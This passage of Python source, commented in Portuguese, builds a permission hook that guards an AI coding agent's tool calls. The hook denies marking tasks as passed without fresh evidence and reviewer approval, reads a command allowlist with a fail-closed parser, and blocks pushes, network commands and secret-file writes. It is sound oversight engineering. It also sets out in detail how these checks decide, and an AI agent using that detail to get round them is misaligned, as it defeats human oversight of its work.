    `features: []`) devolve `False` — ausência de features não é "concluído",
    é "nada declarado ainda"; mesmo comportamento anterior (deny genérico)."""
    passes_map = _feature_passes_map(feature_list)
    if not passes_map:
        return False
    return all(passes_map.values())


def _pending_task_id(feature_list: Any) -> str:
    """Id da primeira feature ainda pendente (`passes` falso) de
    `feature_list` — o `task_id` que o agente deve passar para
    `harness task add-file`. `<task_id>` literal quando não há pendente ou o
    formato não é reconhecível.

    Item 5 do backlog do dogfood venv-Windows: o que separa "existe um
    comando" de "cole isto" é o id já preenchido. A mensagem de deny é lida
    por um agente que acabou de ser bloqueado; obrigá-lo a abrir o
    `feature_list.json` para descobrir o id é o custo que o item existe para
    remover. Ordem de iteração = ordem de declaração no Plans.md, que é a
    ordem em que as tarefas são executadas — a primeira pendente é a tarefa
    corrente na esmagadora maioria dos casos."""
    for feature_id, passes in _feature_passes_map(feature_list).items():
        if not passes:
            return str(feature_id)
    return "<task_id>"


def _transitions_to_true(old_data: Any, new_data: Any) -> list[Any]:
    old_map = _feature_passes_map(old_data)
    new_map = _feature_passes_map(new_data)
    return [fid for fid, val in new_map.items() if val and not old_map.get(fid, False)]


def _evidence_freshness_problem(
    cwd: Path | str | None, feature_id: Any, commit_ts: str | None, contract: str = ""
) -> tuple[str | None, dict[str, Any] | None]:
    """`(None, evidence)` se a evidência de `feature_id` existe, é DO CONTRATO
    ativo, é válida e (quando `commit_ts` fornecido) mais nova que ele; senão,
    `(problema, None)` descrevendo o problema. O dict de evidência é devolvido
    junto (mesmo objeto já parseado, sem reler o arquivo) para o chamador
    reusar na checagem do veto do revisor (comparação contra
    `evidencia.recorded_at`).

    A checagem de contrato é o que impede a prova de um contrato ANTERIOR de
    destravar `passes:true` numa tarefa nunca verificada — todo contrato tem
    um `T-01`. Antes existia só o frescor contra o último commit, que é defesa
    temporal: só funciona se houver um commit entre os dois contratos."""
    base = Path(cwd) if cwd else Path(".")
    slug = (str(contract or "").strip() or UNSCOPED_EVIDENCE_DIR_NAME)
    relative = f"{EVIDENCE_DIR_NAME}/{slug}/{feature_id}.json"
    evidence_path = base / EVIDENCE_DIR_NAME / slug / f"{feature_id}.json"
    if not evidence_path.is_file():
        return f"{feature_id}: sem evidência ({relative} não existe)", None
    try:
        evidence = json.loads(evidence_path.read_text(encoding="utf-8-sig"))
    except (OSError, json.JSONDecodeError):
        return f"{feature_id}: evidência inválida (JSON malformado)", None
    if not isinstance(evidence, dict) or evidence.get("feature_id") != feature_id:
        return f"{feature_id}: evidência inválida (feature_id não corresponde)", None
    evidence_contract = str(evidence.get("contract") or "")
    if contract and evidence_contract != contract:
        return (
            f"{feature_id}: evidência é do contrato "
            f"'{evidence_contract or '(ausente)'}', não do contrato ativo '{contract}'"
        ), None
    recorded_dt = _parse_iso8601(evidence.get("recorded_at"))
    if recorded_dt is None:
        return f"{feature_id}: evidência inválida (recorded_at ausente ou não-ISO8601)", None
    if commit_ts is not None:
        commit_dt = _parse_iso8601(commit_ts)
        if commit_dt is not None and recorded_dt <= commit_dt:
            return (
                f"{feature_id}: evidência mais antiga que o último commit "
                f"(recorded_at={evidence.get('recorded_at')})"
            ), None
    return None, evidence


def _read_team_manifest(cwd: Path | str | None) -> dict[str, Any] | None:
    """Lê `.harness/team/manifest.json`; devolve o dict só se o arquivo
    existir e for JSON válido representando um objeto — ausência ou JSON
    inválido devolve `None` (time não compilado ou artefato corrompido: em
    ambos os casos a checagem do veto do revisor é pulada por inteiro,
    comportamento IDÊNTICO à Fase 3)."""
    base = Path(cwd) if cwd else Path(".")
    manifest_path = base / TEAM_MANIFEST_RELATIVE_PATH
    if not manifest_path.is_file():
        return None
    try:
        data = json.loads(manifest_path.read_text(encoding="utf-8-sig"))
    except (OSError, json.JSONDecodeError):
        return None
    if not isinstance(data, dict):
        return None
    return data


def _manifest_requires_review(manifest: dict[str, Any] | None) -> bool:
    """`True` só quando o manifesto declara AMBOS os papéis `producer` e
    `reviewer` — decisão do planejador: revisão obrigatória é por PROJETO,
    não por-tarefa."""
    if manifest is None:
        return False
    roles = manifest.get("roles")
    if not isinstance(roles, list):
        return False
    role_set = {r for r in roles if isinstance(r, str)}
    return "producer" in role_set and "reviewer" in role_set


def _feature_by_id(data: Any, feature_id: Any) -> dict[str, Any] | None:
    if not isinstance(data, dict):
        return None
    for feat in data.get("features") or []:
        if isinstance(feat, dict) and feat.get("id") == feature_id:
            return feat
    return None


def _review_gate_problem(
    cwd: Path | str | None,
    feature_id: Any,
    feature_data: dict[str, Any] | None,
    commit_ts: str | None,
    evidence: dict[str, Any] | None,
) -> str | None:
    """`None` se o veto do revisor está satisfeito para `feature_id`; senão,
    string descrevendo o problema específico. Só chamada depois que o
    manifesto já confirmou `producer`+`reviewer` (`_manifest_requires_review`)
    E a evidência da feature já foi confirmada fresca (`evidence` não é
    `None` quando chamada nesse fluxo)."""
    base = Path(cwd) if cwd else Path(".")
    try:
        review = load_review(base, feature_id)
    except ReviewError as exc:
        return f"{feature_id}: registro de revisão inválido ({exc})"

    status = review.get("status")
    if status != "approved":
        return (
            f"{feature_id}: revisão pendente/rejeitada (status='{status}') — "
            f"rode harness review {feature_id} approve antes"
        )

    review_dt = _parse_iso8601(review.get("updated_at"))
    if review_dt is None:
        return f"{feature_id}: registro de revisão sem updated_at válido"

    if commit_ts is not None:
        commit_dt = _parse_iso8601(commit_ts)
        if commit_dt is not None and review_dt <= commit_dt:
            return (
                f"{feature_id}: aprovação mais antiga que o último commit "
                f"(updated_at={review.get('updated_at')})"
            )

    if evidence is not None:
        recorded_dt = _parse_iso8601(evidence.get("recorded_at"))
        if recorded_dt is not None and review_dt < recorded_dt:
            return (
                f"{feature_id}: aprovação obsoleta — evidência foi regravada depois "
                f"da aprovação (evidencia.recorded_at={evidence.get('recorded_at')}, "
                f"review.updated_at={review.get('updated_at')})"
            )

    if is_test_diff(feature_data or {}, base):
        justification = review.get("justification")
        if not justification or not str(justification).strip():
            return f"{feature_id}: aprovação de diff de teste sem justificativa registrada"

    return None


def evaluate_feature_list_edit(
    tool_name: str, tool_input: dict[str, Any], cwd: Path | str | None
) -> tuple[str, str] | None:
    """Avalia edição (`Edit`/`Write`) especificamente ao próprio
    `.harness/feature_list.json`.

    Retorna `("allow"|"deny", motivo)` se a edição transicionar alguma
    feature de `passes` != `true` para `passes: true` (caso especial de
    feature-lock), se o JSON proposto for inválido, ou se o `old_string` de
    um `Edit` não bater no `current_text` (edit que vira no-op silencioso).
    Retorna `None` só quando o JSON é válido, o `old_string` foi encontrado e
    aplicado, mas não há transição para `passes:true` nenhuma — o chamador
    deve delegar ao comportamento genérico de superfície (`_evaluate_file`),
    que hoje já resulta em `deny` para este path.
    """
    base = Path(cwd) if cwd else Path(".")
    feature_list_path = base / FEATURE_LIST_RELATIVE_PATH
    current_text = (
        feature_list_path.read_text(encoding="utf-8") if feature_list_path.is_file() else "{}"
    )

    if tool_name == "Write":
        proposed_text = tool_input.get("content") or ""
    else:  # Edit
        old_string = tool_input.get("old_string") or ""
        new_string = tool_input.get("new_string") or ""
        if old_string and old_string not in current_text:
            return "deny", (
                "feature_list.json: old_string do Edit não foi encontrado no "
                "arquivo atual — se está editando mais de uma feature no mesmo "
                "Edit, confira se o bloco bate exatamente com o conteúdo atual; "
                "edite uma feature por vez se não tiver certeza"
            )
        if tool_input.get("replace_all"):
            proposed_text = current_text.replace(old_string, new_string)
        else:
            proposed_text = current_text.replace(old_string, new_string, 1)

    try:
        old_data = json.loads(current_text) if current_text.strip() else {}
    except json.JSONDecodeError:
        old_data = {}
    try:
        new_data = json.loads(proposed_text)
    except json.JSONDecodeError as exc:
        return "deny", (
            f"feature_list.json: edição proposta produz JSON inválido ({exc}) — "
            "edite uma feature por vez ou corrija a sintaxe antes de tentar de novo"
        )

    transitioned = _transitions_to_true(old_data, new_data)
    if not transitioned:
        return None

    commit_ts = _read_last_commit_timestamp(base)
    problems: list[str] = []
    evidence_by_id: dict[Any, dict[str, Any]] = {}
    for fid in transitioned:
        problem, evidence = _evidence_freshness_problem(
            base, fid, commit_ts, str(new_data.get("contract") or "")
        )
        if problem:
            problems.append(problem)
        else:
            evidence_by_id[fid] = evidence  # type: ignore[assignment]
    if problems:
        return "deny", (
            "feature-lock: transição para passes:true sem evidência fresca — "
            + "; ".join(problems)
            + " — rode harness verify <id> primeiro"
        )

    manifest = _read_team_manifest(base)
    review_required = _manifest_requires_review(manifest)
    if review_required:
        review_problems = [
            p
            for p in (
                _review_gate_problem(
                    base, fid, _feature_by_id(new_data, fid), commit_ts, evidence_by_id.get(fid)
                )
                for fid in transitioned
            )
            if p
        ]
        if review_problems:
            return "deny", (
                "feature-lock: revisão do time (produtor-revisor) pendente/obsoleta — "
                + "; ".join(review_problems)
            )

    success_message = (
        "feature-lock: transição para passes:true com evidência fresca confirmada para "
        + ", ".join(str(fid) for fid in sorted(transitioned, key=str))
    )
    if review_required:
        success_message += " e revisão do time (produtor-revisor) aprovada"
    return "allow", success_message


# ---------------------------------------------------------------------------
# governance.extra_allowed_commands (Python real, IMPORTÁVEL) — comandos
# permanentes que o dono do repo declara em `.harness/harness.yaml` além do
# que já deriva de verify_cmd/lint/build/install/git local. Diferente das
# peças acima, este bloco PRECISA importar `yaml`/`harness.config` — só é
# seguro porque roda em código REAL do pacote (aqui e em
# `install_boundary_guard`), nunca embutido no script standalone gerado
# (que continua stdlib-only). Desde o Item 3 esta leitura NÃO alimenta mais o
# hook (que lê o YAML em runtime, ver bloco logo abaixo) — ela sobrou para o
# `session_permissions.py`, que compila o `settings.json`, e para o
# cross-check de gramática de `compile-session`.
# ---------------------------------------------------------------------------
HARNESS_YAML_RELATIVE_PATH = ".harness/harness.yaml"

# ---------------------------------------------------------------------------
# Leitura em RUNTIME de governance.extra_allowed_commands (Item 3 do backlog do
# dogfood venv-Windows).
#
# A allowlist era BAKEADA no script gerado, então mudá-la exigia
# `compile-session` — mesmo quando quem editava era o USUÁRIO no terminal
# próprio, onde nenhum hook intercepta. Era 1 das 3 operações de cada ciclo de
# fricção. O bake nunca teve razão de performance: o guard já lê dois JSONs do
# disco a cada tool call (`feature_list.json`, `repo-profile.json`).
#
# O obstáculo real é que o script standalone é stdlib-only por design — não
# pode `import yaml`. A saída escolhida (opção 2 do item; a opção 1, gravar a
# lista normalizada no `compiled-state-session.json`, foi descartada por ainda
# exigir `compile-session`, isto é, por não resolver o item) é um parser MÍNIMO
# e PROPOSITALMENTE BURRO, restrito à sublista `governance.extra_allowed_commands`.
#
# O custo honesto disso é um SEGUNDO parser de YAML, que entende menos que o
# primeiro. Duas contenções:
#   1. Fail-safe inegociável: o que ele não entende vira lista VAZIA, nunca
#      lixo aceito. Erro de leitura/parse só REDUZ superfície.
#   2. `harness compile-session` compara o que o pyyaml lê com o que este
#      parser lê (`extra_allowed_commands_grammar_problem`) e AVISA quando
#      divergem — sem isso, uma entrada em sintaxe não suportada viraria um
#      deny silencioso em runtime, com o `settings.json` afirmando o contrário.
# ---------------------------------------------------------------------------
#: Indicadores de YAML que este parser não trata (âncora, alias, tag, escalar
#: de bloco, coleção de fluxo, chave explícita, reservados). Um item começando
#: por qualquer um deles derruba a lista inteira para vazia — degradar é a
#: única saída correta, porque interpretá-los pela metade seria aceitar lixo.
_YAML_UNSUPPORTED_ITEM_PREFIXES = ("&", "*", "!", "|", ">", "[", "{", "?", "%", "@", "`")


def _yaml_strip_inline_comment(raw: str) -> str:
    """Remove comentário inline de um escalar YAML não citado.

    Só corta em `#` PRECEDIDO de espaço (regra do YAML) e fora de aspas —
    `curl -H 'X#Y'` e `pytest -k a#b` preservam o `#`."""
    in_single = False
    in_double = False
    for i, ch in enumerate(raw):
        if ch == "'" and not in_double:
            in_single = not in_single
        elif ch == '"' and not in_single:
            in_double = not in_double
        elif ch == "#" and not in_single and not in_double and i > 0 and raw[i - 1].isspace():
            return raw[:i]
    return raw


def _yaml_scalar_item(raw: str) -> str | None:
    """Normaliza UM item de lista YAML. Devolve `None` se a sintaxe está fora
    do que este parser aceita — o chamador trata isso como "não entendi o
    arquivo" e devolve lista vazia inteira, nunca um item silenciosamente
    perdido no meio de uma lista aceita."""
    value = raw.strip()
    if not value:
        return None
    if value[0] in ("'", '"'):
        # Aspas internas exigiriam tratar escape/duplicação — fora do escopo.
        if len(value) < 2 or value[-1] != value[0] or value[0] in value[1:-1] or "\\" in value:
            return None
        return value[1:-1].strip() or None
    if value.startswith(_YAML_UNSUPPORTED_ITEM_PREFIXES):
        return None
    value = _yaml_strip_inline_comment(value).strip()
    if not value:
        return None
    if ": " in value or value.endswith(":"):
        # `: ` num escalar nu é ambíguo em YAML (poderia ser mapeamento). Um
        # `:` colado NÃO é (`pytest tests/a.py::test_b` é escalar válido).
        return None
    return value


def _yaml_split_flow_items(body: str) -> list[str] | None:
    """Divide o corpo de uma sequência de fluxo (`[a, "b c"]`) por vírgulas
    fora de aspas. `None` se houver aninhamento (`[`/`{`) ou aspas
    desbalanceadas."""
    items: list[str] = []
    current: list[str] = []
    in_single = False
    in_double = False
    for ch in body:
        if ch == "'" and not in_double:
            in_single = not in_single
            current.append(ch)
        elif ch == '"' and not in_single:
            in_double = not in_double
            current.append(ch)
        elif ch in ("[", "]", "{", "}") and not in_single and not in_double:
            return None
        elif ch == "," and not in_single and not in_double:
            items.append("".join(current))
            current = []
        else:
            current.append(ch)
    if in_single or in_double:
        return None
    tail = "".join(current)
    if tail.strip():
        items.append(tail)
    return items


def _yaml_indent(line: str) -> int:
    return len(line) - len(line.lstrip(" "))


def parse_extra_allowed_commands_text(text: str) -> list[str]:
    """Extrai `governance.extra_allowed_commands` de `text` com stdlib apenas.

    Aceita as duas grafias que aparecem na prática — bloco (`- item`, com ou
    sem aspas) e fluxo (`[a, "b c"]`) — e devolve `[]` para qualquer coisa
    fora disso: tabulação, âncora/alias, escalar de bloco (`|`/`>`),
    aninhamento, chave duplicada, aspas desbalanceadas. Não é um parser de
    YAML e não pretende ser; é o mínimo que responde a UMA pergunta, com
    degradação sempre para a lista vazia (nunca para uma lista maior).
    """
    if "\t" in (text or ""):
        return []
    lines = (text or "").splitlines()

    governance_line = None
    for index, line in enumerate(lines):
        if _yaml_indent(line) != 0:
            continue
        stripped = line.strip()
        if stripped.startswith("#"):
            continue
        if _yaml_strip_inline_comment(stripped).strip() == "governance:":
            if governance_line is not None:
                return []
            governance_line = index
    if governance_line is None:
        return []

    key_index = None
    key_rest = ""
    key_indent = 0
    for index in range(governance_line + 1, len(lines)):
        line = lines[index]
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        indent = _yaml_indent(line)
        if indent == 0:
            break  # fim do bloco `governance:`
        if not stripped.startswith("extra_allowed_commands:"):
            continue
        if key_index is not None:
            return []  # chave duplicada — ambíguo, degrada
        key_index = index
        key_indent = indent
        key_rest = stripped[len("extra_allowed_commands:"):]

    if key_index is None:
        return []

    rest = _yaml_strip_inline_comment(key_rest).strip()
    if rest:
        if not (rest.startswith("[") and rest.endswith("]")):
            return []
        raw_items = _yaml_split_flow_items(rest[1:-1])
        if raw_items is None:
            return []
        parsed = [_yaml_scalar_item(item) for item in raw_items]
        return [] if any(item is None for item in parsed) else [item for item in parsed if item]

    collected: list[str] = []
    for index in range(key_index + 1, len(lines)):
        line = lines[index]
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        if _yaml_indent(line) <= key_indent:
            break
        if not stripped.startswith("- "):
            return []
        item = _yaml_scalar_item(stripped[2:])
        if item is None:
            return []
        collected.append(item)
    return collected


def read_extra_allowed_commands_runtime(repo_root: Any) -> list[str]:
    """Lê `governance.extra_allowed_commands` de `<repo_root>/.harness/harness.yaml`
    com stdlib apenas — é ESTA a função embutida no hook standalone, chamada a
    cada tool call. Qualquer falha (arquivo ausente, ilegível, sintaxe fora do
    parser mínimo) devolve `[]`: o guard fecha, nunca abre."""
    import os

    try:
        path = os.path.join(str(repo_root or "."), HARNESS_YAML_RELATIVE_PATH)
        with open(path, "r", encoding="utf-8-sig") as handle:
            text = handle.read()
    except (OSError, ValueError):
        return []
    try:
        return parse_extra_allowed_commands_text(text)
    except Exception:
        return []


def load_extra_allowed_commands(target_dir: Path) -> list[str]:
    """Lê `governance.extra_allowed_commands` de `target_dir/.harness/harness.yaml`.

    Non-fatal por design (mesma postura de degradação graciosa de
    `.harness/repo-profile.json` ausente): arquivo ausente, YAML inválido,
    raiz do YAML não sendo um mapeamento, ou schema divergente
    (`ValidationError`) devolvem `[]` — nunca lança, nunca quebra
    `install_boundary_guard`/`compile_session_permissions` em repos sem o
    arquivo ou com um `harness.yaml` malformado."""
    yaml_path = Path(target_dir) / HARNESS_YAML_RELATIVE_PATH
    if not yaml_path.is_file():
        return []
    try:
        raw = yaml.safe_load(yaml_path.read_text(encoding="utf-8"))
    except yaml.YAMLError:
        return []
    if not isinstance(raw, dict):
        return []
    try:
        config = HarnessConfig.model_validate(raw)
    except ValidationError:
        return []
    return list(config.governance.extra_allowed_commands)


def extra_allowed_commands_grammar_problem(target_dir: Path) -> str | None:
    """Divergência entre o que o pyyaml lê e o que o parser mínimo do hook lê.

    Contrapartida obrigatória do Item 3: com a allowlist lida em runtime por um
    parser deliberadamente burro, uma entrada escrita em sintaxe que ele não
    entende viraria um **deny silencioso** — o `settings.json` compilado
    (produzido pelo pyyaml, via `load_extra_allowed_commands`) afirmaria que o
    comando é permitido, e o guard negaria. Pior ainda: o parser degrada a
    lista INTEIRA para vazia, então uma entrada malformada derruba as boas
    junto. `harness compile-session` chama isto e avisa em stderr.

    Devolve `None` quando as duas leituras concordam."""
    declared = load_extra_allowed_commands(target_dir)
    understood = read_extra_allowed_commands_runtime(target_dir)
    if declared == understood:
        return None
    ignored = [cmd for cmd in declared if cmd not in understood]
    detail = (
        "o hook NAO vai honrar: " + ", ".join(repr(c) for c in ignored)
        if ignored
        else f"o hook le uma lista diferente: {understood!r}"
    )
    return (
        "governance.extra_allowed_commands esta em uma sintaxe que o parser "
        "minimo do boundary_guard nao entende (ele e stdlib-only e aceita so "
        "lista de bloco `- item` ou de fluxo `[a, b]`, sem ancora/alias, "
        "escalar de bloco ou aninhamento) — " + detail + ". Reescreva as "
        "entradas em uma dessas duas formas; do contrario o settings.json diz "
        "que o comando e permitido e o guard nega em runtime"
    )


def load_protected_branches(target_dir: Path) -> list[str]:
    """Lê `governance.protected_branches` de `target_dir/.harness/harness.yaml`.

    Mesma degradação graciosa de `load_extra_allowed_commands`, mas o
    fallback é o DEFAULT do modelo (main/homolog/develop), não lista vazia —
    fail-safe aqui é PROTEGER: um harness.yaml ausente/malformado nunca pode
    desligar a regra "commit só via PR"."""
    default = list(HarnessConfig().governance.protected_branches)
    yaml_path = Path(target_dir) / HARNESS_YAML_RELATIVE_PATH
    if not yaml_path.is_file():
        return default
    try:
        raw = yaml.safe_load(yaml_path.read_text(encoding="utf-8"))
    except yaml.YAMLError:
        return default
    if not isinstance(raw, dict):
        return default
    try:
        config = HarnessConfig.model_validate(raw)
    except ValidationError:
        return default
    return list(config.governance.protected_branches)


# ---------------------------------------------------------------------------
# Render (puro) — devolve o CÓDIGO-FONTE do hook standalone
# ---------------------------------------------------------------------------

def _sorted_set_repr(items) -> str:
    """`repr` de um conjunto de strings com ordem determinística.

    `set(...)!r` embutido em código-fonte gerado varia de texto entre
    processos Python distintos — a ordem de iteração de um `set` real
    depende do hash de string, randomizado por `PYTHONHASHSEED` (fixo
    dentro de um processo, mas não entre processos). Sem determinismo,
    nenhum check de drift por comparação/hash do hook compilado é
    possível. O texto gerado ainda avalia para um `set` real em runtime —
    só a ORDEM na fonte fica fixa, o que não muda a semântica (sets não
    têm ordem)."""
    return "{" + ", ".join(repr(v) for v in sorted(set(items))) + "}"


def render_boundary_guard(protected_branches: list[str] | None = None) -> str:
    """Devolve o código-fonte (string) do hook `PreToolUse` standalone.

    Não recebe mais `extra_allowed_commands` (Item 3): a allowlist de comandos
    extras deixou de ser bakeada e passou a ser lida do `.harness/harness.yaml`
    a cada tool call. `protected_branches` continua bakeado — mudá-lo é
    decisão de governança rara, e o fail-safe dele é o oposto (um YAML ausente
    ou malformado precisa PROTEGER, então ler em runtime com degradação para
    lista vazia desligaria a regra "commit só via PR" pelo caminho errado).

    O script gerado lê o payload JSON do stdin e decide `allow`/`deny` para
    todo `tool_name` (matcher `"*"`), roteando explicitamente `Edit`/`Write`/
    `NotebookEdit`/`PowerShell`/`Bash`, na ORDEM descrita no docstring do
    módulo. Não importa nada de `harness.*` — stdlib apenas.

    A faixa "runtime floor", "âncora de raiz do repo" (Item 6 — deriva de
    `cwd`) e "frescor de feature-lock" (ver docstring do módulo) é GERADA a
    partir do código-fonte real das funções/constantes importáveis acima,
    via `inspect.getsource()` — elimina a segunda cópia digitada à mão para
    essa fatia da lógica; mudou a fonte importável, o hook gerado muda junto
    na próxima instalação, sem edição manual dos dois lados. O veto do
    revisor (`_review_gate_problem`/`_load_review_record`)
    permanece com implementação PRÓPRIA no lado standalone: depende de
    `harness.review` (`ReviewError`, `load_review`, `is_test_diff`), que o
    hook não pode importar — ver docstring do módulo, seção "Veto do
    revisor". Idem para `_glob_to_regex`/`_is_test_diff`/`_evaluate_*`
    (avaliação de superfície genérica) e para o roteamento de `main()`, que
    não têm contraparte importável (dependem de peças que só existem no
    script standalone — ver docstring do módulo).
    """
    baked_protected_branches = list(
        protected_branches
        if protected_branches is not None
        else HarnessConfig().governance.protected_branches
    )
    shared_sources = [
        f"_SHELL_SPLIT = re.compile({_SHELL_SPLIT.pattern!r})",
        f"FLOOR_BASH_SEQUENCES = {FLOOR_BASH_SEQUENCES!r}",
        inspect.getsource(_tokenize_command),
        inspect.getsource(_has_sequence),
        f"VENV_DIR_NAMES = {VENV_DIR_NAMES!r}",
        f"VENV_BIN_DIR_NAMES = {VENV_BIN_DIR_NAMES!r}",
        f"PYTHON_MODULE_HEADS = {PYTHON_MODULE_HEADS!r}",
        f"_MAX_NORMALIZATION_PASSES = {_MAX_NORMALIZATION_PASSES!r}",
        inspect.getsource(_strip_exe_suffix),
        inspect.getsource(venv_prefixed_binary),
        inspect.getsource(normalize_invocation_tokens),
        f"GIT_MODE_SENSITIVE_SUBCOMMANDS = {_sorted_set_repr(GIT_MODE_SENSITIVE_SUBCOMMANDS)}",
        inspect.getsource(suggested_allowlist_entry),
        inspect.getsource(_yaml_has_top_level_governance_key),
        inspect.getsource(allowlist_yaml_hint),
        inspect.getsource(command_escape_hint),
        inspect.getsource(_has_sequence_normalized),
        inspect.getsource(is_floor_bash_command),
        inspect.getsource(_current_git_branch),
        f"CONTRACT_BRANCH_PREFIX = {CONTRACT_BRANCH_PREFIX!r}",
        f"PUSH_ALLOWED_FLAGS = {PUSH_ALLOWED_FLAGS!r}",
        f"_PUSH_FORBIDDEN_CHARS = {_PUSH_FORBIDDEN_CHARS!r}",
        f"_PUSH_ARG_PATTERN = re.compile({_PUSH_ARG_PATTERN.pattern!r})",
        inspect.getsource(is_git_push_command),
        inspect.getsource(contract_branch_push_problem),
        inspect.getsource(is_floor_secret_path),
        inspect.getsource(is_floor_bash_secret_redirect),
        DISABLED_CHECK_SRC,
        f"DISABLE_SENTINEL_BASENAME = {DISABLE_SENTINEL_BASENAME!r}",
        f"FLOOR_DISABLE_SEQUENCES = {FLOOR_DISABLE_SEQUENCES!r}",
        inspect.getsource(is_floor_disable_sentinel_path),
        inspect.getsource(is_floor_disable_command),
        inspect.getsource(is_floor_bash_disable_redirect),
        f"_PS_NETWORK_PATTERN = re.compile({_PS_NETWORK_PATTERN.pattern!r})",
        f"_PS_WRITE_CMDLET_PATTERN = re.compile({_PS_WRITE_CMDLET_PATTERN.pattern!r})",
        f"_PS_WRITEALLTEXT_PATTERN = re.compile({_PS_WRITEALLTEXT_PATTERN.pattern!r})",
        inspect.getsource(is_floor_powershell_network),
        inspect.getsource(is_floor_powershell_secret_write),
        f"HARNESS_YAML_RELATIVE_PATH = {HARNESS_YAML_RELATIVE_PATH!r}",
        f"_YAML_UNSUPPORTED_ITEM_PREFIXES = {_YAML_UNSUPPORTED_ITEM_PREFIXES!r}",
        inspect.getsource(_yaml_strip_inline_comment),
        inspect.getsource(_yaml_scalar_item),
        inspect.getsource(_yaml_split_flow_items),
        inspect.getsource(_yaml_indent),
        inspect.getsource(parse_extra_allowed_commands_text),
        inspect.getsource(read_extra_allowed_commands_runtime),
        f"DOCS_SURFACE_DIR_PREFIX = {DOCS_SURFACE_DIR_PREFIX!r}",
        f"DOCS_SURFACE_EXCLUDED_BASENAMES = {_sorted_set_repr(DOCS_SURFACE_EXCLUDED_BASENAMES)}",
        f"DOCS_SURFACE_EXCLUDED_PATHS = {_sorted_set_repr(DOCS_SURFACE_EXCLUDED_PATHS)}",
        inspect.getsource(_is_docs_surface_path),
        f"WORK_DIR_PREFIX = {WORK_DIR_PREFIX!r}",
        f"SCRATCH_DIR_PREFIX = {SCRATCH_DIR_PREFIX!r}",
        inspect.getsource(_is_work_surface_path),
        inspect.getsource(_is_scratch_surface_path),
        f"CONTROL_PLANE_DIR_NAME = {CONTROL_PLANE_DIR_NAME!r}",
        f"CONTROL_PLANE_WRITABLE_DIRS = {CONTROL_PLANE_WRITABLE_DIRS!r}",
        f"CONTROL_PLANE_WRITABLE_FILES = {CONTROL_PLANE_WRITABLE_FILES!r}",
        inspect.getsource(is_floor_control_plane_path),
        f"PROGRESS_FILE_PATH = {PROGRESS_FILE_PATH!r}",
        inspect.getsource(_is_progress_file_path),
        inspect.getsource(_is_claude_memory_path),
        f"READONLY_SHELL_UTILITIES = {_sorted_set_repr(READONLY_SHELL_UTILITIES)}",
        f"FIND_WRITE_FLAGS = {_sorted_set_repr(FIND_WRITE_FLAGS)}",
        f"GREP_RG_EXEC_FLAGS = {GREP_RG_EXEC_FLAGS!r}",
        inspect.getsource(_is_grep_exec_flag),
        f"DATE_WRITE_FLAGS = {DATE_WRITE_FLAGS!r}",
        inspect.getsource(_is_date_write_flag),
        inspect.getsource(_segment_has_file_redirect),
        inspect.getsource(_is_readonly_shell_segment),
        f"READONLY_PS_CMDLETS = {_sorted_set_repr(READONLY_PS_CMDLETS)}",
        inspect.getsource(_is_readonly_ps_cmdlet_segment),
        inspect.getsource(_is_safe_cd_segment),
        f"SESSION_STATE_FILE = {SESSION_STATE_FILE!r}",
        f"REPO_ROOT_STATE_KEY = {REPO_ROOT_STATE_KEY!r}",
        f"_MAX_ROOT_SEARCH_DEPTH = {_MAX_ROOT_SEARCH_DEPTH!r}",
        inspect.getsource(_find_session_state_path),
        inspect.getsource(_read_repo_root_from_state),
        inspect.getsource(_resolve_repo_root_anchor),
        inspect.getsource(_parse_iso8601),
        inspect.getsource(_feature_passes_map),
        inspect.getsource(_contract_fully_passed),
        inspect.getsource(_pending_task_id),
        inspect.getsource(_transitions_to_true),
        inspect.getsource(_read_last_commit_timestamp),
        f"INSTALL_COMMAND_BY_PACKAGE_MANAGER = {INSTALL_COMMAND_BY_PACKAGE_MANAGER!r}",
        inspect.getsource(install_command_for),
        f"UNSCOPED_EVIDENCE_DIR_NAME = {UNSCOPED_EVIDENCE_DIR_NAME!r}",
        inspect.getsource(_evidence_freshness_problem),
        inspect.getsource(_read_team_manifest),
        inspect.getsource(_manifest_requires_review),
        inspect.getsource(_feature_by_id),
    ]
    shared_block = "\n".join(src.rstrip("\n") for src in shared_sources) + "\n"
    if "'''" in shared_block:
        # Defesa: se algum docstring futuro introduzir ''' o delimitador do
        # template abaixo quebraria silenciosamente — falha alto e cedo.
        raise RuntimeError(
            "render_boundary_guard: fonte importável embutida contém ''' — "
            "incompatível com o delimitador do template standalone"
        )

    header = '''"""Hook PreToolUse gerado pelo harness-creator — NÃO editar à mão.

Dispatcher único de fronteira (Edit/Write/MultiEdit/NotebookEdit/PowerShell/Bash) para
a superfície do contrato ativo (.harness/feature_list.json). Registrado com
matcher "*" (casa toda tool call — ver docstring de harness.boundary_guard,
seção "Matcher do hook e roteamento explícito", para a justificativa);
main() roteia explicitamente cada tool conhecida e aplica uma política
mínima de allow/deny-por-nome para tools desconhecidas (deploy single-user
interno, ver mesma seção). Gerado por
harness.boundary_guard.render_boundary_guard(); para mudar o
comportamento, edite o contrato/profile e rode a instalação novamente —
não edite este arquivo diretamente.

ORDEM DE AVALIAÇÃO (não reordenar): o runtime floor roda incondicionalmente
antes de qualquer checagem de contrato — mesmo sem .harness/feature_list.json
no repo, git push, comandos de rede do PowerShell e escrita em arquivo de
segredo (via Edit/Write, PowerShell ou redirecionamento/tee no Bash)
continuam DENY.

A faixa abaixo marcada "GERADO" vem de harness.boundary_guard via
inspect.getsource() (mesma lógica da versão importável, testável via
pytest direto) — não editada à mão nesta faixa.
"""
from __future__ import annotations

import json
import re
import subprocess
import sys
from datetime import datetime
from pathlib import Path

# --- GERADO a partir de harness.boundary_guard (inspect.getsource) ---
'''

    middle = ('''
# --- fim da faixa gerada ---

# --- comandos git locais sempre liberados quando há contrato ativo ---
FIXED_GIT_SEQUENCES = [
    ["git", "status"],
    ["git", "log"],
    ["git", "diff"],
    ["git", "add"],
    ["git", "commit"],
    # TRES tokens de proposito: o match e por PREFIXO, entao ["git","branch"]
    # liberaria `-D`/`-d`/`-m` de carona numa entrada que so quer LER o nome da
    # branch atual. Atrito 3 do ciclo do contrato `harness-finish` - sem isto o
    # agente descobria a branch lendo a primeira linha do `git status`.
    ["git", "branch", "--show-current"],
]

# --- subcomandos do proprio harness sempre liberados quando ha contrato
# ativo: a ferramenta que GERENCIA o contrato nao pode ficar presa no
# guard que ela mesma gerou. Cobre as duas formas de invocacao
# documentadas nas skills (python -m harness.cli) e o console-script real
# (harness). A lista e BAKEADA de harness.boundary_guard.HARNESS_CLI_VERBS
